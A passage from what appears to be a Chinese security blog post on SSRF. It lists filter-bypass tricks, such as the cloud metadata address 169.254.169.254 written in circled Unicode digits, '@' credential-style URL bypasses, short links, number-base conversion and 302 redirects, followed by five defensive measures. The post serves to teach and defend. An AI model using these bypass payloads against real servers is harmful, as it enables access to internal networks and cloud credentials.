+<p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http://\[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④\]">http://169.254.169.254&gt;&gt;&gt;http://\[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④\]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p>
+</blockquote>
+<p><strong>二、常见限制</strong></p>
+<p>1.限制为<a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com</a> 域名</p>
+<blockquote>
+<p>采用http基本身份认证的方式绕过，即@<br><a href="http://www.xxx.com@www.xxc.com/" target="_blank" rel="noopener">http://www.xxx.com@www.xxc.com</a></p>
+</blockquote>
+<p>2.限制请求IP不为内网地址</p>
+<blockquote>
+<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
+</blockquote>
+<p>3.限制请求只为http协议</p>
+<blockquote>
+<p>（1）采取302跳转<br>（2）采取短地址</p>
+</blockquote>
+<h2 id="8、SSRF-漏洞漏防御"><a href="#8、SSRF-漏洞漏防御" class="headerlink" title="8、SSRF 漏洞漏防御"></a>8、SSRF 漏洞漏防御</h2><p>通常有以下5个思路：</p>
+<ol>
+<li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li>
+<li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li>
+<li>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</li>
+<li>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</li>
+<li>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</li>
+</ol>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a href="https://blog.csdn.net/qq_43378996/article/details/124050308" target="_blank" rel="noopener">https://blog.csdn.net/qq_43378996/article/details/124050308</a></li>
+<li><a href="https://blog.csdn.net/qq_48904485/article/details/123653514" target="_blank" rel="noopener">https://blog.csdn.net/qq_48904485/article/details/123653514</a></li>
+<li><a href="https://blog.csdn.net/nobugnomoney/article/details/123953973" target="_blank" rel="noopener">https://blog.csdn.net/nobugnomoney/article/details/123953973</a></li>
+<li><a href="https://blog.csdn.net/shangguanliubei/article/details/136834347" target="_blank" rel="noopener">https://blog.csdn.net/shangguanliubei/article/details/136834347</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/security/" class="category-chain-item">security</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>漏洞之 SSRF（Server-Side Request Forgery，服务器端请求伪造）</div>
+      <div>https://flepeng.github.io/081-security-漏洞-漏洞之-SSRF（Server-Side-Request-Forgery，服务器端请求伪造）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Lepeng</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年3月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/081-security-%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E4%B9%8B-DDoS%EF%BC%88Distributed-Denial-of-Service%EF%BC%8C%E5%88%86%E5%B8%83%E5%BC%8F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%EF%BC%89/" title="漏洞之 DDoS（Distributed Denial of Service，分布式拒绝服务）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">漏洞之 DDoS（Distributed Denial of Service，分布式拒绝服务）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/081-security-%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E4%B9%8B-SQL-Injection%EF%BC%88SQL-%E6%B3%A8%E5%85%A5%EF%BC%89/" title="漏洞之 SQL Injection（SQL 注入）">
+                        <span class="hidden-mobile">漏洞之 SQL Injection（SQL 注入）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"flepeng/hexo-blog-comment","repo-id":"R_kgDOL0qaig","category":"Announcements","category-id":"DIC_kwDOL0qais4CfBIv","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
